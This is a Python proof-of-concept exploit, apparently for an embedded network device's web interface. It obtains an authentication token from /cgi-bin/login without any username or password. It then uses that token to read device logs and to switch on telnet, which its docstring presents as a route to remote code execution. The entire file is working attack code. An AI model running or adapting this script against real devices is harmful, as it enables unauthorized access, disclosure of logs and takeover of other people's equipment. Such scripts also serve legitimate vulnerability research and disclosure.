"""
Broken auth: 
    - get token without providing any username and password
    - use it to read logs
    - use it to enable telnet (if not yet enabled) to show it can lead to RCE    
"""

import json
import sys
from pprint import pprint

import requests

URL = "http://192.168.188.253"

CGREEN = "\33[32m [+]"
CRED = "\33[31m[!]"
CRESET = "\033[0m"


def do_broken_auth() -> dict[str, str] | None:
    """Do broken authentication
    When we don't provide username and password we get an auth token.

    Returns:
        dict[str, str]|None: Authentication JSON
    """
    rq = requests.post(
        URL + "/cgi-bin/login", data={"funname": 1, "action": 1}, timeout=1
    )
    if rq.ok:
        return json.loads(rq.text)
    return None


def read_logs(token: str) -> list[str] | None:
    """Read log from ax device (authenticated)

    Args:
        token (str): Token

    Returns:
        list[str] | None: Log entries
    """
    rq = requests.post(
        URL + "/cgi-bin/sys_dev",
        cookies={"stork": token},
        data={"funname": 5, "action": 3},
        timeout=1,
    )
    if rq.ok:
        return rq.text.split("\n")[:-1]
    return None


def enable_telnet(token: str) -> bool:
    """Enable telnet

    Args:
        token (str): Authentication token

    Returns:
        bool: True when we successfully enabled telnet or if it was already enabled
    """
    rq = requests.post(
        URL + "/cgi-bin/sys_dev",
        cookies={"stork": token},
        data={"funname": 3, "action": 1},
        timeout=1,
    )
    if not rq.ok:
        print(f"{CRED} Could not read telnet status")
        return False

    if json.loads(rq.text)["enable_telnet"] == "1":
        print(f"{CGREEN} Telnet is already enabled")
        return True

    # enable telnet when it is disabled
    rq = requests.post(
        URL + "/cgi-bin/sys_dev",
        cookies={"stork": token},
        data={"funname": 3, "action": 2, "local_enable_telnet": 1},
        timeout=1,
    )

    if not rq.ok:
        return False

    return True


def main():

    # do exploitation
    auth_info = do_broken_auth()
    if not auth_info:
        print(f"{CRED} Could not auth")
        sys.exit(-1)
    print(f"{CGREEN} Login:", auth_info)

    token = auth_info["token"]
    print(f"{CGREEN} Token: {token}")

    # authenticated actions
    logs = read_logs(token=token)
    if not logs:
        print(f"{CRED} Could not read logs")
        sys.exit(-1)
    print(f"{CGREEN} Logs:{CRESET}")
    pprint(logs, width=200)

    if not enable_telnet(token):
        print(f"{CRED} Could not send request enable telnet")
        sys.exit(-1)
    print(f"{CGREEN} Telnet enabled!")


if __name__ == "__main__":
    main()
